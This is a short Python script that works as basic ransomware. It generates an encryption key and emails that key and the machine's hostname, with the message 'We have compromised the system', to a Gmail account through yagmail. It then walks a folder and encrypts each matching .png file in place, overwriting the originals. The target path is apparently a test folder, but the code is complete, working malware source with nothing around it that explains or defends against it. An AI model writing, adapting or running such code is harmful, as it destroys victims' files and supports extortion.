import glob, os, yagmail, socket
from cryptography.fernet import Fernet

def crypt(fileText):
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(fileText)

    return cipher_text

def cryptList(files):
    for each in files:
        fileName = each['fileName']
        file = open(fileName, "rb")
        cryptedFile = crypt(file.read())
        file.close()
        file = open(fileName, "wb")
        file.write(cryptedFile)
        file.close()

def oldSort(fileList):
    newList = []
    for each in fileList:
        print(each)
        time = os.path.getmtime(each)
        newList.append({'fileName': each, 'Time':time})
    newList = sorted(newList, key=lambda k: k['Time'])
    newList.reverse()
    return newList

def send(message):
    try:
        # initializing the server connection
        yag = yagmail.SMTP(user='your@gmail.com', password='password')
        # sending the email
        yag.send(to='your@gmail.com', subject='Sending Attachment',
                 contents= str(message))
        print("Email sent successfully")
    except:
        print("Error, email was not sent")

def findFiles(folderName,fileType):
    os.chdir(str(folderName))
    files = []
    start_dir = os.getcwd()
    pattern = "*." + fileType

    for dir, _, _ in os.walk(start_dir):
        files.extend(glob.glob(os.path.join(dir, pattern)))
    print(files)

    files = oldSort(files)
    print(files)
    return files
if __name__ == '__main__':
    key = Fernet.generate_key()
    print(key)
    send("We have compromised the system " + str(socket.gethostname()+ " the key is " + str(key)))
    cryptList(findFiles("/Users/retiateam/Desktop/Test/", "png"))
